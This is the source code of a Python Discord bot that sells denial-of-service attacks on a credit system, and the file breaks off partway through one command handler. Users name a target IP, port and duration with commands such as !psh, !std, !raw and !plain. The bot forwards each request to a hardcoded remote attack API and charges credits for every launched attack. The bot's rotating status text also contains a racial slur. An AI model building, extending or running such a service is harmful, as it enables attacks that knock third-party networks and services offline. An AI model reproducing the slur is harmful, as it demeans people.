import discord
from discord.ext import commands
import time
import random
import requests
import subprocess
import socket
import threading
import subprocess
import json
import asyncio
from datetime import datetime

#replace all ids,
#replace token,
#replace api and or api key


whitelisted_admin = , 
token = ""
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix="!", intents=intents)
rgb_color = (0, 0, 0)
hex_color = f'#{rgb_color[0]:02x}{rgb_color[1]:02x}{rgb_color[2]:02x}'


def deduct_credits(auth_id):
  with open('database.json', 'r') as json_file:
    data = json.load(json_file)

  matching_entry = None
  for entry in data['ids']:
      if entry['id'] == auth_id:
          matching_entry = entry
          break

  if matching_entry:
      matching_entry['credits'] -= 5

      with open('database.json', 'w') as json_file:
          json.dump(data, json_file, indent=4)
  else:
      print("No entry found with the provided user ID.")

  return matching_entry['credits']

def is_allowed(user_id):
    with open("users.txt", "r") as file:
        allowed_users = file.read().splitlines()
    return str(user_id) in allowed_users

def call_api(method, ip, port, atime):
  url = f"http://74.50.80.206:3000/api/attacks/{ip}/{port}/{method}/{atime}?key="
  response = requests.get(url)

  parsed_data = json.loads(response.text)
  response_co = ""

  if response.status_code == 200:
    response_co = parsed_data["success"]
  elif response.status_code == 406:
    response_co = parsed_data["error"]
  else:
    response_co = parsed_data["error"]

  return response_co


quotes = [
    #"FirstGarden's 'thing' is a testament to dreaming big and reaching even bigger.",
    #"Let FirstGarden's colossal 'thing' inspire you to aim higher and grow beyond limits.",
    #"In FirstGarden, the 'thing' isn't just big; it's a symbol of endless possibilities.",
    "L + NEGRO",
]

async def send_ppx():
    await client.wait_until_ready()
    while not client.is_closed():
        quote = random.choice(quotes)
        await client.change_presence(status=discord.Status.dnd, activity=discord.Game(name=quote))
        await asyncio.sleep(1.5)

@client.event
async def on_ready():
    threading.Thread(target=lambda: client.loop.create_task(send_ppx())).start()
    print("Bot initialized")

@client.event
async def on_message(message):

    user_id = message.author.id

    if message.author == client.user:
        return

    try:
        with open('database.json') as fw:
            data_amp = json.load(fw)
    except FileNotFoundError:
        print("File 'database.json' not found.")
        exit(1)
    except Exception as e:
        print("An error occurred while reading the JSON file:", e)
        exit(1)

    auth = user_id

    if isinstance(message.channel, discord.DMChannel):
        target_user = await client.fetch_user(whitelisted_admin)
        if target_user:
            await target_user.send(f"`[{datetime.now()}] Received a DM from {message.author}`\n```{message.content}```")

    if message.content.startswith("!dmuser"):
        if message.author.id == whitelisted_admin:
            args = message.content.split()[1:]

            if len(args) >= 2:
                id_ = args[0]
                msg = ' '.join(args[1:])
                target_user = await client.fetch_user(int(id_))
                await target_user.send(f"{msg}")
                await message.reply("Sent message to user.")
            else:
                await message.reply("Please provide both user ID and message.")
        else:
            embed = discord.Embed(
                title="__Information__",
                description=f"`You do not have access to this command.`",
                color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)




    if message.content.startswith("!remove"):
        if message.author.id == whitelisted_admin:
            text = message.content[len('!remove'):].strip()

            with open("database.json", 'r') as file:
                data = json.load(file)

            removed = False
            for idx, entry in enumerate(data["ids"]):
                if entry["id"] == int(text):
                    del data["ids"][idx]
                    removed = True
                    break

            if removed:
                with open("database.json", 'w') as file:
                    json.dump(data, file, indent=4)

                embed = discord.Embed(
                    title="__Information__",
                    description=f"`Successfully removed {text} from whitelist.`",
                    color=int(hex_color[1:], 16))
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                await message.reply(embed=embed)
            else:
                embed = discord.Embed(
                    title="__Information__",
                    description=f"`ID {text} not found in the database.`",
                    color=int(hex_color[1:], 16))
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                await message.reply(embed=embed)
        else:
            embed = discord.Embed(
                title="__Information__",
                description=f"`You do not have access to this command.`",
                color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)

    if message.content.startswith("!credsrem"):
      if message.author.id == whitelisted_admin:
        text = message.content[len('!add'):].strip()
        args = message.content.split()[1:]
        ppfar = False

        if len(args) == 2:
            id_user, credits = args

            with open('database.json', 'r') as file:
                data = json.load(file)

            for entry in data['ids']:
                if entry['id'] == int(id_user):
                    ppfar = True
                    entry['credits'] -= int(credits)
                    with open('database.json', 'w') as file:
                        json.dump(data, file, indent=4)

                    embed = discord.Embed(
                    title="__Information__",
                    description=f"```Successfully removed {credits} credits from {id_user}.```",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                    break

            if not ppfar:
                embed = discord.Embed(
                    title="__Information__",
                    description=f"`This user does not have access to the bot.`",
                    color=int(hex_color[1:], 16))
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                await message.reply(embed=embed)


        else:
            embed = discord.Embed(
            title="__Information__",
            description=f"`Incorrect arguments.`",
            color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)
      else:
            embed = discord.Embed(
            title="__Information__",
            description=f"`You do not have access to this command.`",
            color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)

    if message.content.startswith("!credsadd"):
      if message.author.id == whitelisted_admin:
        text = message.content[len('!add'):].strip()
        args = message.content.split()[1:]
        ppfar = False

        if len(args) == 2:
            id_user, credits = args

            with open('database.json', 'r') as file:
                data = json.load(file)

            for entry in data['ids']:
                if entry['id'] == int(id_user):
                    ppfar = True
                    entry['credits'] += int(credits)
                    with open('database.json', 'w') as file:
                        json.dump(data, file, indent=4)

                    embed = discord.Embed(
                    title="__Information__",
                    description=f"```Successfully added {credits} credits to {id_user}.```",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                    break

            if not ppfar:
                embed = discord.Embed(
                    title="__Information__",
                    description=f"`This user does not have access to the bot.`",
                    color=int(hex_color[1:], 16))
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                await message.reply(embed=embed)


        else:
            embed = discord.Embed(
            title="__Information__",
            description=f"`Incorrect arguments.`",
            color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)
      else:
            embed = discord.Embed(
            title="__Information__",
            description=f"`You do not have access to this command.`",
            color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)



    if message.content.startswith("!add"):
      if message.author.id == whitelisted_admin:
        text = message.content[len('!add'):].strip()
        args = message.content.split()[1:]

        if len(args) == 5:
          ida, duration, cooldown, concurrents, credits = args

       # with open("users.txt", "a") as file:
       #   file.write(text + "\n")
       #   file.close()

        new_id = {
            "id": int(ida),
            "cooldown": int(cooldown),
            "duration": int(duration),
            "concurrents": int(concurrents),
            "credits": int(credits)
        }

        with open("database.json", "r") as json_file:
            data = json.load(json_file)

        data["ids"].append(new_id)

        with open("database.json", "w") as json_file:
            json.dump(data, json_file, indent=4)

        embed = discord.Embed(
        title="__Information__",
        description=f"```Successfully added {ida} to the whitelist.\nDuration: {duration}\nCooldown: {cooldown}\nConcurrents: {concurrents}\nCredits: {credits}```",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)
      else:
        embed = discord.Embed(
        title="__Information__",
        description=f"`You do not have access to this command.`",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)

    if message.content.startswith("!say"):
        if message.author.id == whitelisted_admin:
          texwadt = message.content[len('!say'):].strip()
          await message.channel.send(texwadt)
          await message.delete()
        else:
            embed = discord.Embed(
                title="__Information__",
                description=f"`You do not have access to this command.`",
                color=int(hex_color[1:], 16))
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)

    if message.content.startswith("!display"):
      pppo = auth
      texwadt = message.content[len('!display'):].strip()

      try:
        if texwadt:
          pppo = int(texwadt)
      except:
        pass



      found_user = False
      for license_info in data_amp['ids']:
          if license_info['id'] == pppo:
              found_user = True
              duration = license_info['duration']
              cooldown = license_info['cooldown']
              concurrents = license_info['concurrents']
              credits = license_info['credits']
              embed = discord.Embed(
                  title="__User's Plan Information__",
                  description=f"```ID: {str(pppo)}\nDuration: {duration}\nCooldown: {cooldown}\nConcurrents: {concurrents}\nCredits: {credits}```",
                  color=int(hex_color[1:], 16))
              embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
              await message.reply(embed=embed)
              break
      if not found_user:
          embed = discord.Embed(
              title="__Information__",
              description=f"`This user does not have access to the bot.`",
              color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)



    if message.content == "!show":
      if message.author.id == whitelisted_admin:

        with open("database.json", "r") as filae:
          datawa = json.load(filae)

        stra = ""
        for item in datawa["ids"]:
          stra += f"ID: {item['id']}\nDuration: {item['duration']}\nCooldown: {item['cooldown']}\nConcurrents: {item['concurrents']}\nCredits: {item['credits']}\n\n"

        embed = discord.Embed(
        title="__Whitelisted Users__",
        description=f"```{stra}```",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)
      else:
        embed = discord.Embed(
        title="__Information__",
        description=f"`You do not have access to this command.`",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)

    if message.content == "!cls":
      if message.author.id == whitelisted_admin:
        old_channel_name = message.channel.name
        category = message.channel.category

        new_channel = await category.create_text_channel(name=old_channel_name)

        await message.channel.delete()

        await new_channel.send(f"{message.author.mention} channel cleared.")
      else:
        embed = discord.Embed(
        title="__Information__",
        description=f"`You do not have access to this command.`",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)

    if message.content == "!payments":
        embed = discord.Embed(
        title="__Payment Methods__",
        description=f"",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)


    if message.content == "!admin":
      if auth == whitelisted_admin:          
        embed = discord.Embed(
        title="__Admin Menu__",
        color=int(hex_color[1:], 16))

        embed.add_field(name="!add `id` `duration` `cooldown` `concurrents` `credits`", value="adds user to whitelist", inline=False)
        embed.add_field(name="!credsadd `id` `credits amount`", value="adds credits to a user", inline=False)
        embed.add_field(name="!credsrem `id` `credits amount`", value="removes credits from a user", inline=False)
        embed.add_field(name="!remove `id`", value="removes user from whitelist", inline=False)
        embed.add_field(name="!say `message`", value="says input message", inline=False)
        embed.add_field(name="!dmuser `id` `message`", value="dms input id", inline=False)
        embed.add_field(name="!cls", value="purges channel", inline=False)
        embed.add_field(name="!show", value="shows whitelisted users", inline=False)
        embed.add_field(name="!payments", value="shows payment methods", inline=False)

        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        embed.set_image(url="https://cdn.discordapp.com/attachments/1214106190297178142/1214109998616023040/6TZPPfPFz1sS5sHmMRwaLpu5783ASgXpbx28.png?ex=65f7eb0c&is=65e5760c&hm=96580dfd690ea06d87a42de404029d4b4589ead999ad6d0564276059e0b546b8&")
        
        await message.reply(embed=embed)
      else:
        embed = discord.Embed(
        title="__Information__",
        description=f"`You do not have access to this command.`",
        color=int(hex_color[1:], 16))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
        await message.reply(embed=embed)

    if message.content == "!help":
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True

                start_time = time.time()
                abc = await message.channel.send(".")
                end_time = time.time() 
                latency_ms = (end_time - start_time) * 1000           
                embed = discord.Embed(
                    title="__Help Menu__",
                    color=int(hex_color[1:], 16)
                )
                embed.add_field(name="!psh `ip` `port` `time`", value="psh method", inline=False)
                embed.add_field(name="!std `ip` `port` `time`", value="std method", inline=False)
                embed.add_field(name="!raw `ip` `port`", value="raw method", inline=False)
                embed.add_field(name="!plain `ip` `port` `time`", value="plain method", inline=False)
                embed.add_field(name="!syn `ip` `port` `time`", value="syn method", inline=False)
                embed.add_field(name="!greip `ip` `port` `time`", value="greip method", inline=False)
                embed.add_field(name="!kriticos `ip` `port` `time`", value="kriticos method", inline=False)
                embed.add_field(name="!display (`id`)", value="displays your plan information", inline=False)
                embed.add_field(name="!admin", value="shows admin commands", inline=False)
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                embed.set_image(url="https://cdn.discordapp.com/attachments/1214106190297178142/1214109998616023040/6TZPPfPFz1sS5sHmMRwaLpu5783ASgXpbx28.png?ex=65f7eb0c&is=65e5760c&hm=96580dfd690ea06d87a42de404029d4b4589ead999ad6d0564276059e0b546b8&")
                embed.set_footer(text=f"\nPing: ({latency_ms:.2f}ms)")
                await abc.delete()
                await message.reply(embed=embed)
                break
        
        if not found_user:
            embed = discord.Embed(
                title="__Information__",
                description=f"`You do not have access to this command.`",
                color=int(hex_color[1:], 16)
            )
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
            await message.reply(embed=embed)


    if message.content.startswith('!psh'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("psh", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: psh\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !psh {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)

    if message.content.startswith('!std'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("std", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: std\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !std {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)

    if message.content.startswith('!raw'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("raw", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: raw\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !raw {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)

                break

        if not found_user:
          embed = discord.Embed(
          title="__Information__",
          description=f"`You do not have access to this command.`",
          color=int(hex_color[1:], 16))
          embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
          await message.reply(embed=embed)

    if message.content.startswith('!plain'):
        found_user = False
        for license_info in data_amp['ids']:
            if license_info['id'] == auth:
                found_user = True
                duration = license_info['duration']
                cooldown = license_info['cooldown']
                concurrents = license_info['concurrents']
                credits = license_info['credits']
                args = message.content.split()[1:]
                if len(args) == 3:
                  ip, port, atime = args
                  ppx = int(duration) + 1
                  if (int(atime) < ppx):

                    if credits > 4:

                      call = call_api("plain", ip, int(port), int(atime))
                      
                      txtcon = f"```Method: plain\nHost: {ip}\nPort: {port}\nDuration: {atime}\nFull Command: !plain {ip} {port} {atime}\nAPI Response: {call}\n\n"

                      if call == "Attack has been launched":
                        pppppa = deduct_credits(auth)
                        txtcon += f"5 credits have been deducted from your user. You now have {pppppa} credits.```"
                      else:
                        txtcon += f"Looks like there's an error. 5 credits have not been deducted from your user.```"


                      embed = discord.Embed(
                      title="__Information__",
                      description=f"{txtcon}",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                    else:
                      embed = discord.Embed(
                      title="__Information__",
                      description=f"`You do not have enough credits.`",
                      color=int(hex_color[1:], 16))
                      embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                      await message.reply(embed=embed)
                  else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`You can only send attacks with a maximum time of {duration} seconds.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
                    await message.reply(embed=embed)
                else:
                    embed = discord.Embed(
                    title="__Information__",
                    description=f"`Incorrect usage, try the !help command.`",
                    color=int(hex_color[1:], 16))
                    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1174448619928162374/1219289819251998871/result_animated_logo1EPurple.gif?ex=660ac322&is=c4f5&is=65e74ff5&hm=a2950fa31858c33bba7206ef008de495fc41a8741691b78fc4f9ce2cb6593fe5&")
